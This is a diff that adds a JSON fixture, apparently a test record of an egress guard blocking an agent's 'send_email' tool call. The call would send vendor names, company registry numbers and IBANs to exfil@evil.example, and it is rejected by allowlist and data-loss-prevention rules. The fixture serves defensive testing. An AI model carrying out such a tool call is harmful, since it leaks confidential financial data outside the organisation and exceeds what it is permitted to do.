@@ -1,0 +1,40 @@
+{
+  "endpoint": "POST /egress",
+  "status": 403,
+  "request": {
+    "tool": "send_email",
+    "target": "exfil@evil.example",
+    "content": "ACME s.r.o. 12345678 CZ6508000000192000145399; Beta Servis a.s. 87654321 ..."
+  },
+  "response": {
+    "error": "egress_blocked",
+    "message": "target not on allowlist; registry identifiers in content",
+    "details": {
+      "decision": {
+        "decision": "block",
+        "rule_ids": [
+          "E-ALLOWLIST",
+          "E-DLP-IBAN",
+          "E-DLP-ICO"
+        ],
+        "findings": [
+          {
+            "rule_id": "E-ALLOWLIST",
+            "detail": "evil.example not allowlisted",
+            "count": 1
+          },
+          {
+            "rule_id": "E-DLP-IBAN",
+            "detail": "IBANs from vendor registry",
+            "count": 2
+          },
+          {
+            "rule_id": "E-DLP-ICO",
+            "detail": "ICO from vendor registry",
+            "count": 2
+          }
+        ]
+      }
+    }
+  }
+}
